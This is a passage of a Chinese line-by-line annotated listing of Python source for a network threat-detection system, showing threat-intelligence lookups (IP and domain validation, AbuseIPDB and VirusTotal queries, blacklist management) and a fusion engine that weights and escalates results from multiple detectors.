| 426 | 返回结果：把处理后的值交回调用方。 | `        return {` |
| 427 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "is_malicious": bool(ext.get("is_malicious")),` |
| 428 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "source": ext.get("source", "none"),` |
| 429 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "score": ext.get("score"),` |
| 430 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "degraded": ext.get("degraded", False),` |
| 431 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "reason": ext.get("reason"),` |
| 432 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "ioc_value": value.strip(),` |
| 433 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 434 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 435 | 函数定义：声明 `check_ip` 的输入、处理逻辑和返回结果。 | `    def check_ip(self, ip: str) -> dict:` |
| 436 | 条件判断：满足条件时进入对应分支。 | `        if not self._validate_ip(ip):` |
| 437 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning("[ThreatIntel] 无效的 IP 地址格式: %r", ip)` |
| 438 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 439 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "is_malicious": False,` |
| 440 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "source": "none",` |
| 441 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "reason": "invalid_ip_format",` |
| 442 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 443 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        r = self._check_ioc_core("ip", ip)` |
| 444 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        r["ioc_value"] = r.get("ioc_value") or ip` |
| 445 | 返回结果：把处理后的值交回调用方。 | `        return r` |
| 446 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 447 | 函数定义：声明 `check_domain` 的输入、处理逻辑和返回结果。 | `    def check_domain(self, domain: str) -> dict:` |
| 448 | 条件判断：满足条件时进入对应分支。 | `        if not domain or not isinstance(domain, str):` |
| 449 | 返回结果：把处理后的值交回调用方。 | `            return {"is_malicious": False, "source": "none"}` |
| 450 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        r = self._check_ioc_core("domain", domain.strip())` |
| 451 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        r["ioc_value"] = r.get("ioc_value") or domain.strip().lower()` |
| 452 | 返回结果：把处理后的值交回调用方。 | `        return r` |
| 453 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 454 | 函数定义：声明 `check_ioc` 的输入、处理逻辑和返回结果。 | `    def check_ioc(self, ioc_type: str, value: str) -> Dict[str, Any]:` |
| 455 | 文档字符串：说明当前模块、类或函数的职责。 | `        """通用 IOC 前置查询（含 url / file_hash / cve）。"""` |
| 456 | 返回结果：把处理后的值交回调用方。 | `        return self._check_ioc_core(ioc_type.strip().lower(), value)` |
| 457 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 458 | 函数定义：声明 `query_abuseipdb_detailed` 的输入、处理逻辑和返回结果。 | `    def query_abuseipdb_detailed(self, ip: str) -> dict:` |
| 459 | 条件判断：满足条件时进入对应分支。 | `        if not self._validate_ip(ip):` |
| 460 | 返回结果：把处理后的值交回调用方。 | `            return {"ok": False, "reason": "invalid_ip_format"}` |
| 461 | 条件判断：满足条件时进入对应分支。 | `        if self._use_mock_external() and not self.abuseipdb_key:` |
| 462 | 返回结果：把处理后的值交回调用方。 | `            return _mock_abuseipdb(ip)` |
| 463 | 返回结果：把处理后的值交回调用方。 | `        return self._providers["abuseipdb"].query(` |
| 464 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "ip", ip, timeout=self.external_http_timeout` |
| 465 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 466 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 467 | 函数定义：声明 `query_virustotal_ip` 的输入、处理逻辑和返回结果。 | `    def query_virustotal_ip(self, ip: str) -> dict:` |
| 468 | 条件判断：满足条件时进入对应分支。 | `        if not self._validate_ip(ip):` |
| 469 | 返回结果：把处理后的值交回调用方。 | `            return {"ok": False, "reason": "invalid_ip_format"}` |
| 470 | 条件判断：满足条件时进入对应分支。 | `        if self._use_mock_external() and not self.virustotal_key:` |
| 471 | 返回结果：把处理后的值交回调用方。 | `            return _mock_virustotal("ip", ip)` |
| 472 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        r = self._providers["virustotal"].query(` |
| 473 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "ip", ip, timeout=self.external_http_timeout` |
| 474 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 475 | 条件判断：满足条件时进入对应分支。 | `        if r.get("ok") and r.get("is_malicious"):` |
| 476 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._add_memory("ip", ip)` |
| 477 | 返回结果：把处理后的值交回调用方。 | `        return r` |
| 478 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 479 | 函数定义：声明 `query_virustotal_domain` 的输入、处理逻辑和返回结果。 | `    def query_virustotal_domain(self, domain: str) -> dict:` |
| 480 | 条件判断：满足条件时进入对应分支。 | `        if not isinstance(domain, str) or not _DOMAIN_PATTERN.match(domain.strip()):` |
| 481 | 返回结果：把处理后的值交回调用方。 | `            return {"ok": False, "reason": "invalid_domain_format"}` |
| 482 | 条件判断：满足条件时进入对应分支。 | `        if self._use_mock_external() and not self.virustotal_key:` |
| 483 | 返回结果：把处理后的值交回调用方。 | `            return _mock_virustotal("domain", domain)` |
| 484 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        r = self._providers["virustotal"].query(` |
| 485 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "domain", domain, timeout=self.external_http_timeout` |
| 486 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 487 | 条件判断：满足条件时进入对应分支。 | `        if r.get("ok") and r.get("is_malicious"):` |
| 488 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._add_memory("domain", domain)` |
| 489 | 返回结果：把处理后的值交回调用方。 | `        return r` |
| 490 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 491 | 函数定义：声明 `update_blacklist` 的输入、处理逻辑和返回结果。 | `    def update_blacklist(self) -> None:` |
| 492 | 上下文管理：自动管理资源打开与释放。 | `        with self._lock:` |
| 493 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            count = len(self._ip_blacklist)` |
| 494 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._last_update = _utc_now()` |
| 495 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info("[ThreatIntel] 黑名单已更新，当前 %d 条 IP", count)` |
| 496 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 497 | 函数定义：声明 `get_blacklist_stats` 的输入、处理逻辑和返回结果。 | `    def get_blacklist_stats(self) -> dict:` |
| 498 | 上下文管理：自动管理资源打开与释放。 | `        with self._lock:` |
| 499 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 500 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "ip_count": len(self._ip_blacklist),` |
| 501 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "domain_count": len(self._domain_blacklist),` |
| 502 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "url_count": len(self._url_blacklist),` |
| 503 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "file_hash_count": len(self._hash_blacklist),` |
| 504 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "cve_count": len(self._cve_blacklist),` |
| 505 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "last_update": (` |
| 506 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    self._last_update.isoformat() if self._last_update else None` |
| 507 | 代码语句：参与当前文件的业务流程或数据处理。 | `                ),` |
| 508 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 509 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 510 | 函数定义：声明 `add_ip_to_blacklist` 的输入、处理逻辑和返回结果。 | `    def add_ip_to_blacklist(self, ip: str) -> bool:` |
| 511 | 条件判断：满足条件时进入对应分支。 | `        if not self._validate_ip(ip):` |
| 512 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning("[ThreatIntel] 拒绝将无效 IP 加入黑名单: %r", ip)` |
| 513 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 514 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._add_memory("ip", ip)` |
| 515 | 返回结果：把处理后的值交回调用方。 | `        return True` |
| 516 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 517 | 函数定义：声明 `add_domain_to_blacklist` 的输入、处理逻辑和返回结果。 | `    def add_domain_to_blacklist(self, domain: str) -> bool:` |
| 518 | 条件判断：满足条件时进入对应分支。 | `        if not domain or not isinstance(domain, str):` |
| 519 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 520 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._add_memory("domain", domain)` |
| 521 | 返回结果：把处理后的值交回调用方。 | `        return True` |
| 522 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 523 | 函数定义：声明 `add_ioc_to_blacklist` 的输入、处理逻辑和返回结果。 | `    def add_ioc_to_blacklist(self, ioc_type: str, value: str) -> bool:` |
| 524 | 文档字符串：说明当前模块、类或函数的职责。 | `        """将任意支持的 IOC 写入内存黑名单（值需已通过上层校验）。"""` |
| 525 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        t = (ioc_type or "").strip().lower()` |
| 526 | 条件判断：满足条件时进入对应分支。 | `        if t not in _IOC_TYPES:` |
| 527 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 528 | 条件判断：满足条件时进入对应分支。 | `        if t == "ip" and not self._validate_ip(value.strip()):` |
| 529 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 530 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._add_memory(t, value)` |
| 531 | 返回结果：把处理后的值交回调用方。 | `        return True` |
| 532 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 533 | 函数定义：声明 `remove_ip_from_blacklist` 的输入、处理逻辑和返回结果。 | `    def remove_ip_from_blacklist(self, ip: str) -> bool:` |
| 534 | 上下文管理：自动管理资源打开与释放。 | `        with self._lock:` |
| 535 | 条件判断：满足条件时进入对应分支。 | `            if ip in self._ip_blacklist:` |
| 536 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._ip_blacklist.discard(ip)` |
| 537 | 返回结果：把处理后的值交回调用方。 | `                return True` |
| 538 | 返回结果：把处理后的值交回调用方。 | `        return False` |
| 539 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 540 | 函数定义：声明 `remove_domain_from_blacklist` 的输入、处理逻辑和返回结果。 | `    def remove_domain_from_blacklist(self, domain: str) -> bool:` |
| 541 | 条件判断：满足条件时进入对应分支。 | `        if not isinstance(domain, str):` |
| 542 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 543 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        lower = domain.lower()` |
| 544 | 上下文管理：自动管理资源打开与释放。 | `        with self._lock:` |
| 545 | 条件判断：满足条件时进入对应分支。 | `            if lower in self._domain_blacklist:` |
| 546 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._domain_blacklist.discard(lower)` |
| 547 | 返回结果：把处理后的值交回调用方。 | `                return True` |
| 548 | 返回结果：把处理后的值交回调用方。 | `        return False` |
| 549 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 550 | 函数定义：声明 `snapshot_local_entries` 的输入、处理逻辑和返回结果。 | `    def snapshot_local_entries(self) -> Dict[str, List[str]]:` |
| 551 | 上下文管理：自动管理资源打开与释放。 | `        with self._lock:` |
| 552 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 553 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "ip": sorted(self._ip_blacklist),` |
| 554 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "domain": sorted(self._domain_blacklist),` |
| 555 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "url": sorted(self._url_blacklist),` |
| 556 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "file_hash": sorted(self._hash_blacklist),` |
| 557 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "cve": sorted(self._cve_blacklist),` |
| 558 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 559 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 560 | 函数定义：声明 `query_provider` 的输入、处理逻辑和返回结果。 | `    def query_provider(` |
| 561 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self, provider: str, ioc_type: str, value: str` |
| 562 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> Dict[str, Any]:` |
| 563 | 文档字符串：说明当前模块、类或函数的职责。 | `        """单 provider 查询（供 Web API）；不抛异常。"""` |
| 564 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        prov = self._providers.get(provider)` |
| 565 | 条件判断：满足条件时进入对应分支。 | `        if not prov:` |
| 566 | 返回结果：把处理后的值交回调用方。 | `            return {"ok": False, "provider": provider, "reason": "unknown_provider"}` |
| 567 | 条件判断：满足条件时进入对应分支。 | `        if self._use_mock_external():` |
| 568 | 条件判断：满足条件时进入对应分支。 | `            if provider == "abuseipdb":` |
| 569 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                r = (` |
| 570 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    _mock_abuseipdb(value)` |
| 571 | 条件判断：满足条件时进入对应分支。 | `                    if ioc_type == "ip"` |
| 572 | 兜底分支：处理前面条件都不满足的情况。 | `                    else {**not_configured(provider), "reason": "unsupported_type"}` |
| 573 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 574 | 条件分支：前面条件不满足时继续判断。 | `            elif provider == "virustotal":` |
| 575 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                r = _mock_virustotal(ioc_type, value)` |
| 576 | 兜底分支：处理前面条件都不满足的情况。 | `            else:` |
| 577 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                r = prov.query(ioc_type, value, timeout=0.1)` |
| 578 | 兜底分支：处理前面条件都不满足的情况。 | `        else:` |
| 579 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            r = prov.query(ioc_type, value, timeout=self.external_http_timeout)` |
| 580 | 条件判断：满足条件时进入对应分支。 | `        if r.get("ok") and r.get("is_malicious") and provider in ("abuseipdb", "virustotal"):` |
| 581 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._add_memory(ioc_type, value)` |
| 582 | 返回结果：把处理后的值交回调用方。 | `        return r` |

## `src/decision/__init__.py`

- 类型：决策融合
- 行数：7

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 代码语句：参与当前文件的业务流程或数据处理。 | `﻿"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `src.decision 包初始化` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `对应架构文档 §5.5 融合决策层` |
| 4 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 5 | 导入对象：从指定模块引入类、函数或常量。 | `from .fusion_engine import FusionEngine` |
| 6 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 7 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `__all__ = ["FusionEngine"]` |

## `src/decision/fusion_engine.py`

- 类型：决策融合
- 行数：144

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `多模型融合决策引擎` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `对应架构文档 §5.5 融合决策层` |
| 4 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `核心职责：` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `    1. 接收多个检测引擎的结果列表，过滤掉空结果与 normal 结果。` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `    2. 以威胁等级作为权重，对置信度进行加权融合。` |
| 8 | 代码语句：参与当前文件的业务流程或数据处理。 | `    3. 取最高威胁等级作为基础等级。` |
| 9 | 代码语句：参与当前文件的业务流程或数据处理。 | `    4. 多引擎联动升级：当 2 个或以上引擎同时报警时，` |
| 10 | 代码语句：参与当前文件的业务流程或数据处理。 | `       威胁等级自动升级（low→medium→high→critical）。` |
| 11 | 代码语句：参与当前文件的业务流程或数据处理。 | `    5. 输出单个融合后的 DetectionResult，details 字段包含所有引擎的诊断信息。` |
| 12 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 13 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 14 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 15 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 16 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import List, Optional` |
| 17 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 18 | 导入对象：从指定模块引入类、函数或常量。 | `from ..detectors.base import DetectionResult` |
| 19 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 20 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 21 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 22 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 23 | 类定义：声明 `FusionEngine`，封装相关状态与行为。 | `class FusionEngine:` |
| 24 | 文档字符串：说明当前模块、类或函数的职责。 | `    """多引擎融合决策。"""` |
| 25 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 26 | 注释：解释下面或当前这段代码的设计意图。 | `    # 威胁等级权重` |
| 27 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    LEVEL_WEIGHTS = {` |
| 28 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "critical": 1.0,` |
| 29 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "high": 0.8,` |
| 30 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "medium": 0.5,` |
| 31 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "low": 0.2,` |
| 32 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 33 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 34 | 注释：解释下面或当前这段代码的设计意图。 | `    # 等级升级映射` |
| 35 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    LEVEL_UPGRADE = {` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "low": "medium",` |
| 37 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "medium": "high",` |
| 38 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "high": "critical",` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "critical": "critical",  # 已是最高等级` |
| 40 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 41 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 42 | 函数定义：声明 `fuse` 的输入、处理逻辑和返回结果。 | `    def fuse(self, results: List[Optional[DetectionResult]]) -> DetectionResult:` |
| 43 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 44 | 代码语句：参与当前文件的业务流程或数据处理。 | `        对多个检测引擎的结果进行融合。` |
| 45 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 46 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Args:` |
| 47 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            results: 各检测引擎返回的 DetectionResult 列表，` |
| 48 | 代码语句：参与当前文件的业务流程或数据处理。 | `                     允许包含 None（未就绪）或 threat_type=='normal' 的条目。` |
| 49 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 50 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Returns:` |
| 51 | 代码语句：参与当前文件的业务流程或数据处理。 | `            融合后的 DetectionResult。若无有效威胁则返回 normal 结果。` |
| 52 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 53 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        valid_results: List[DetectionResult] = [` |
| 54 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r for r in results if r is not None and r.threat_type != "normal"` |
| 55 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ]` |
| 56 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 57 | 条件判断：满足条件时进入对应分支。 | `        if not valid_results:` |
| 58 | 返回结果：把处理后的值交回调用方。 | `            return DetectionResult(` |
| 59 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                threat_type="normal",` |
| 60 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                threat_level="low",` |
| 61 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                confidence=1.0,` |
| 62 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                details="所有引擎判定为正常",` |
| 63 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                source_ip="",` |
| 64 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                raw_data={"engine_count": len([r for r in results if r is not None])},` |
| 65 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 66 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 67 | 注释：解释下面或当前这段代码的设计意图。 | `        # 加权融合置信度` |
| 68 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        total_weight = 0.0` |
| 69 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        weighted_confidence = 0.0` |
| 70 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        threat_types = []` |
| 71 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        seen_types = set()` |
| 72 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 73 | 循环：逐个处理集合或迭代器中的元素。 | `        for r in valid_results:` |
| 74 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            weight = self.LEVEL_WEIGHTS.get(r.threat_level, 0.5)` |
| 75 | 代码语句：参与当前文件的业务流程或数据处理。 | `            total_weight += weight` |
| 76 | 代码语句：参与当前文件的业务流程或数据处理。 | `            weighted_confidence += r.confidence * weight` |
| 77 | 条件判断：满足条件时进入对应分支。 | `            if r.threat_type not in seen_types:` |
| 78 | 函数调用：执行已有函数/方法完成当前步骤。 | `                seen_types.add(r.threat_type)` |
| 79 | 函数调用：执行已有函数/方法完成当前步骤。 | `                threat_types.append(r.threat_type)` |
| 80 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 81 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        fused_confidence = (` |
| 82 | 代码语句：参与当前文件的业务流程或数据处理。 | `            weighted_confidence / total_weight if total_weight > 0 else 0.0` |
| 83 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 84 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        fused_confidence = min(max(fused_confidence, 0.0), 1.0)` |
| 85 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 86 | 注释：解释下面或当前这段代码的设计意图。 | `        # 取最高威胁等级` |
| 87 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        highest = max(` |
| 88 | 代码语句：参与当前文件的业务流程或数据处理。 | `            valid_results,` |
| 89 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            key=lambda r: self.LEVEL_WEIGHTS.get(r.threat_level, 0.0),` |
| 90 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 91 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        base_level = highest.threat_level` |
| 92 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 93 | 注释：解释下面或当前这段代码的设计意图。 | `        # 多引擎联动升级` |
| 94 | 条件判断：满足条件时进入对应分支。 | `        if len(valid_results) >= 2:` |
| 95 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            final_level = self.LEVEL_UPGRADE.get(base_level, base_level)` |
| 96 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            upgrade_note = (` |
| 97 | 代码语句：参与当前文件的业务流程或数据处理。 | `                f"；多引擎联动升级 {base_level}→{final_level}"` |
| 98 | 条件判断：满足条件时进入对应分支。 | `                if final_level != base_level` |
| 99 | 兜底分支：处理前面条件都不满足的情况。 | `                else ""` |
| 100 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 101 | 兜底分支：处理前面条件都不满足的情况。 | `        else:` |
| 102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            final_level = base_level` |
| 103 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            upgrade_note = ""` |
| 104 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 105 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        details_parts = [r.details for r in valid_results]` |
| 106 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        details = (` |
| 107 | 函数调用：执行已有函数/方法完成当前步骤。 | `            f"融合 {len(valid_results)} 个引擎结果："` |
| 108 | 函数调用：执行已有函数/方法完成当前步骤。 | `            + " \| ".join(details_parts)` |
| 109 | 代码语句：参与当前文件的业务流程或数据处理。 | `            + upgrade_note` |
| 110 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 111 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 112 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        source_ip = next(` |
| 113 | 函数调用：执行已有函数/方法完成当前步骤。 | `            (r.source_ip for r in valid_results if r.source_ip), highest.source_ip` |
| 114 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 115 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 116 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info(` |
| 117 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "[FusionEngine] 融合完成 engines=%d level=%s→%s confidence=%.4f",` |
| 118 | 函数调用：执行已有函数/方法完成当前步骤。 | `            len(valid_results),` |
| 119 | 代码语句：参与当前文件的业务流程或数据处理。 | `            base_level,` |
| 120 | 代码语句：参与当前文件的业务流程或数据处理。 | `            final_level,` |
| 121 | 代码语句：参与当前文件的业务流程或数据处理。 | `            fused_confidence,` |
| 122 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 123 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 124 | 返回结果：把处理后的值交回调用方。 | `        return DetectionResult(` |
| 125 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            threat_type=" + ".join(threat_types),` |
| 126 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            threat_level=final_level,` |
| 127 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            confidence=round(fused_confidence, 4),` |
| 128 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            details=details,` |
| 129 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            source_ip=source_ip,` |
| 130 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            raw_data={` |
| 131 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "engine_count": len(valid_results),` |
| 132 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "base_level": base_level,` |
| 133 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "upgraded": final_level != base_level,` |
| 134 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "sub_results": [` |
| 135 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    {` |
| 136 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "threat_type": r.threat_type,` |
| 137 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "threat_level": r.threat_level,` |
| 138 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "confidence": r.confidence,` |
| 139 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "source_ip": r.source_ip,` |
| 140 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    }` |
| 141 | 循环：逐个处理集合或迭代器中的元素。 | `                    for r in valid_results` |
| 142 | 代码语句：参与当前文件的业务流程或数据处理。 | `                ],` |
